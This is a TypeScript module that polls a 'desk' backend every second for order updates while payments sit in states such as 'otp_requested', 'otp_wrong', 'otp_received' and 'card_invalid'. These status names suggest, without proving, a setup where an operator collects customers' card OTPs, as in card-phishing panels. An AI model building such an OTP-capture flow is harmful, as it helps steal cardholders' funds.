import { fetchDeskOrder, fetchDeskOrders, getDeskKey } from "@/lib/desk";
import { useOrdersStore } from "@/lib/store/orders";

let timer: number | null = null;

function waitingIds() {
  return useOrdersStore
    .getState()
    .orders.filter((o) =>
      ["pending", "otp_requested", "otp_wrong", "otp_received", "card_invalid"].includes(o.paymentStatus),
    )
    .map((o) => o.id);
}

export function startDeskSync() {
  if (typeof window === "undefined" || timer != null) return;

  const tick = async () => {
    try {
      if (getDeskKey()) {
        const remote = await fetchDeskOrders();
        if (Array.isArray(remote)) useOrdersStore.getState().mergeRemote(remote);
        return;
      }
      const ids = [...new Set(waitingIds())];
      if (!ids.length) return;
      const found: NonNullable<Awaited<ReturnType<typeof fetchDeskOrder>>>[] = [];
      for (const id of ids.slice(0, 8)) {
        const order = await fetchDeskOrder(id);
        if (order) found.push(order);
      }
      if (found.length) useOrdersStore.getState().mergeRemote(found);
    } catch {
      /* keep polling */
    }
  };

  const run = () => {
    void tick();
    timer = window.setInterval(() => void tick(), 1000);
  };

  const persist = useOrdersStore.persist;
  if (!persist || persist.hasHydrated()) run();
  else persist.onFinishHydration(run);
}

export function stopDeskSync() {
  if (timer != null) {
    window.clearInterval(timer);
    timer = null;
  }
}
